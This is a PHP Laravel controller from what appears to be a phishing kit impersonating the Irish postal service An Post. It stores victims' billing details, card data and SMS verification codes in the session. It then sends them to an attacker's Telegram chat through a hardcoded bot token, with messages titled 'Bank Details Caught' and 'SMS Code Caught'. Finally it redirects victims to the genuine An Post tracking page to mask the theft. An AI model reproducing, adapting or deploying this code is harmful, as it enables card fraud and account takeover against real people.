<?php

namespace App\Http\Controllers;

use \Illuminate\Http\Request;
use Telegram;

class FormController extends Controller
{
    public function handle_shipping_billing(Request $request)
    {
        $relevant = $this->filter_asp_net_variables($request->all());
        foreach ($relevant as $k => $v)
            $request->session()->put($k, $v);
        return redirect()->route('cc_form_view');
    }

    public function handle_cc_info(Request $request)
    {
        $relevant = $this->filter_asp_net_variables($request->all());
        foreach ($relevant as $k => $v)
            $request->session()->put($k, $v);
        $session = $this->filter_asp_net_variables($request->session()->all());
        $this->telegram(
            view("TelegramNotification")
                ->with("data", $session)
                ->with("title", "New AnPost Bank Details Caught")
                ->toHtml()
        );
        return redirect()->route('processing_view');
    }

    public function handle_sms_verification(Request $request)
    {
        $relevant = $this->filter_asp_net_variables($request->all());
        foreach ($relevant as $k => $v)
            if($k == "sms_code")
                $request->session()->put("sms_code_".date("H_i_s"), $v);
            else
                $request->session()->put($k, $v);
        $session = $this->filter_asp_net_variables($request->session()->all());
        $res = $this->telegram(
            view("TelegramNotification")
                ->with("data", $session)
                ->with("title", "New AnPost SMS Code Caught")
                ->toHtml()
        );
        sleep(3);
        return redirect('https://www.anpost.com/Post-Parcels/Track/Search?lang=ga-ie');
    }


    public function telegram($msg)
    {
        $telegram = new Telegram('1619151622:AAGn3BDVXK7L_J-W5bRmhoXJq-52KK7OHFw');
        $content = array('chat_id' => 1550746079, 'text' => $msg, 'parse_mode' => "html");
        return $telegram->sendMessage($content);
    }

    private function filter_asp_net_variables($array)
    {
        return array_filter($array, function ($name) {
            return strpos($name, "_") !== 0;
        }, ARRAY_FILTER_USE_KEY);
    }
}


